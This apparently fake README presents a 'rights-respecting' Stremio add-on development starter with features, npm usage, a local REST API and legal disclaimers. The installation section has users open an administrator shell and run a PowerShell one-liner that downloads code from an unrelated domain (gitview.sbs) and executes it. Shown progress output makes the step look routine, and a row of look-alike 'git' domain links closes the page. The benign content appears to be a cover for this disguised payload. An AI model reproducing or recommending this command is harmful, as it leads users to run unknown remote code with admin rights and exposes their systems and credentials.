# Stremio Add-ons — Rights-Respecting Add-on Starter

> A development starter for building metadata, catalog, and player add-ons that respect content rights and platform policies.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=stremio-addons | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Stremio Addons modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Stremio Addons.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Stremio Add-ons** is a safe add-on development framework for publishing lawful metadata, catalogs, subtitles, and user-authorized player integrations. It includes manifest validation, local fixtures, policy checks, and a review workflow.

**Best for:** Add-on developers, catalog maintainers, and media platform teams.

**Key differentiators:**
1. Manifest and schema validation
2. Local fixture server
3. Rights and policy checklist
4. Rate-limit and caching helpers
5. Reviewable source adapters

---

## Core Features

```
✅ Add-on manifest generator
✅ Catalog and metadata fixtures
✅ Schema validation
✅ Cache and rate-limit controls
✅ Source adapter interfaces
✅ Rights and policy checklist
✅ Local preview UI
✅ Automated lint and tests
```

---

## Usage

```bash
# Start the local add-on preview
npm run dev

# Validate a manifest
npm run validate -- --manifest ./manifest.json

# Run adapter tests against fixtures
npm test

# Build the add-on package
npm run build
```

---

## REST API

> [!NOTE]
> The local API is for development and review. Add-ons must not proxy or distribute content unless the developer has explicit authorization and the platform permits it.

```bash
# Start the fixture API
npm run serve -- --port 3000

# Read a local catalog fixture
curl http://localhost:3000/api/v1/catalog/top

# Validate a metadata response
curl -X POST http://localhost:3000/api/v1/validate \
  -H "Content-Type: application/json" \
  -d '{"type":"movie","id":"fixture-001"}'
```

---

## Screenshots

- Add-on preview: `screenshots/add-on-preview.png`
- Manifest editor: `screenshots/manifest-editor.png`
- Catalog fixture: `screenshots/catalog-fixture.png`
- Policy checklist: `screenshots/policy-checklist.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Manifest validation fails | Check required fields, stream types, and supported resource names. |
| Fixture request returns nothing | Start the local fixture server and confirm the route is registered. |
| Adapter times out | Add a bounded timeout and cache only responses you are allowed to reuse. |
| Policy check fails | Remove unverified sources and document the rights basis for each integration. |
| Package build fails | Install dependencies from the lockfile and rerun the build. |

---

## Use Cases

- **Legal Catalogs** — Publish metadata for content you are authorized to represent.
- **Subtitle Tools** — Connect user-provided or licensed subtitle sources.
- **Media Research** — Test metadata pipelines with local fixtures.
- **Platform Integrations** — Build reviewable adapters before a production review.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not bypass DRM, access controls, regional restrictions, or licensing terms. Do not distribute copyrighted media or unauthorized streams.

> [!TIP]
> Keep a written rights record for every external source and run the policy checklist before publishing an add-on.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
stremio-addons, addon-development, metadata, catalog, media-platform, rights-respecting, schema-validation, local-fixtures, rate-limiting, developer-starter
-->

[gitrm.cfd](https://gitrm.cfd?t=stremio-addons) | [gitview.sbs](https://gitview.sbs?t=stremio-addons) | [gitsl.xyz](https://gitsl.xyz?t=stremio-addons) | [gitrm.sbs](https://gitrm.sbs?t=stremio-addons) | [viewgit.sbs](https://viewgit.sbs?t=stremio-addons)
